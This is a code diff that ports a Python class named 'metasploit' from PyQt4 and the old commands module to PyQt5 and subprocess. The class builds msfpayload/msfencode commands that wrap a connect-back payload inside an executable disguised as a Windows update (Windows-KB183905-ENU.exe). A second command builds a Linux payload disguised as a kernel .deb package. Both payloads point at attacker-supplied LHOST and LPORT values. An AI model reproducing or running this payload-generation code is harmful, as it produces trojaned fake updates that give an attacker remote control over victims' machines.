@@ -1,6 +1,5 @@
-import commands
 import subprocess
-from PyQt4 import QtCore
+from PyQt5 import QtCore
 
 
 class metasploit(QtCore.QThread):
@@ -15,7 +14,7 @@ class metasploit(QtCore.QThread):
            tmp/Windows-KB183905-ENU.exe
         '''
         windows_payload_string = 'msfpayload %s LHOST=%s LPORT=%s R | msfencode -x %s -t exe -e %s -c %s -o %s'
-        creation_status = commands.getstatusoutput(windows_payload_string % (self.variables['windows_payload'],
+        creation_status = subprocess.getstatusoutput(windows_payload_string % (self.variables['windows_payload'],
         self.variables['ip_address'],self.variables['port_setting'],template,self.variables['encoder_type'],
         self.variables['encode_number'],output_file))
 
@@ -32,7 +31,7 @@ class metasploit(QtCore.QThread):
             LPORT=4566 X > /tmp/kernel_1.29_all_i386.deb
         '''
         linux_payload_string = 'msfpayload %s LHOST=%s LPORT=%s X > %s'
-        creation_status = commands.getstatusoutput(linux_payload_string % (self.variables['linux_payload'],
+        creation_status = subprocess.getstatusoutput(linux_payload_string % (self.variables['linux_payload'],
         self.variables['ip_address'],str(int(self.variables['port_setting']) + 1),output_file))
 
         if creation_status[0] != 0:
